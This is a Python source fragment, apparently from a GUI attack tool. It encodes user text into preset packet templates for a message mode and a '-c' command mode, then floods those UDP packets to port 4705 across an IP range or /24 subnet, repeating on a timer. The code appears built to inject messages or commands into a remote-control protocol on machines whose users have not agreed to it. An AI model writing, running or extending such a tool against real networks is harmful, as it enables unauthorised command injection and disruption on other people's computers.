tt=pyqtSignal
def logger(x):
    global tt
    if __name__=="__main__":
        print(x)
    else: tt.emit("[%s]"%datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')+x)
# 格式化要发送的消息
def format_b4_send(content):
    arr = []
    for ch in content:
        tmp = ''.join(list(map(lambda x: hex(ord(x)), ch)))
        if int(tmp, 16) > 0xff:
            tmp = tmp[2:]
            high = int((tmp[0] + tmp[1]), 16)
            low = int((tmp[2] + tmp[3]), 16)
            arr.append(low)
            arr.append(high)
        else:
            high = 0
            low = int((tmp[2] + tmp[3]), 16)
            arr.append(low)
            arr.append(high)
    return arr


# 获取ip
def get_ip(ip):
    target_host = []
    if ip.find('.') == -1:
        logger('\nYou enter a error IP.')
        logger("Please enter the correct format of the IP again.")
        return
    if ip.find('-') != -1:
        ip_arr = ip.split('-')
        ip_arrs = ip_arr[0].split('.')
        if int(ip_arr[1]) > 254:
            ip_arr[1] = '254'
        for i in range(int(ip_arrs[3]), int(ip_arr[1])+1):
            ip_arrs[3] = str(i)
            target_host.append('.'.join(ip_arrs))
    elif ip.find('/') == -1:
        target_host.append(ip)
    elif ip.find('/24') != -1:
        ip_arr = ip.split('/')
        ip_arrs = ip_arr[0].split('.')
        for i in range(1, 255):
            ip_arrs[3] = str(i)
            target_host.append('.'.join(ip_arrs))
    else:
        logger('\nYou enter a error IP.')
        logger("Please enter the correct format of the IP again.")
        return
    return target_host


# 将要发送的消息打包成完整的指令
def pkg_sendlist(cmdtype, content):
    arrs = format_b4_send(content)
    result=[]
    if cmdtype == '-msg':
        index = 56
        result = basicCMD['-msg']
        for elem in arrs:
            result[index] = elem
            index += 1
    elif cmdtype == '-c':
        index = 578
        result = basicCMD['-c']
        for elem in arrs:
            result[index] = elem
            index += 1
    return result
# 发送
def send(send_list,ip,l=1,p=4705,t=22):
    if len(send_list) == 0:
        logger("[-] error 请使用 -h 以获取命令帮助")
        return
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    target_host = get_ip(ip)
    for times in range(l):
        for i in target_host:
            for abc in send_list:
                payload = pack("%dB" % (len(abc)), *abc)
                client.sendto(payload, (i, p))
        if l == 1:
            logger("发送成功")
        logger("第%s次执行完毕" % str(times + 1))
        if times != l - 1:
            sleep(t)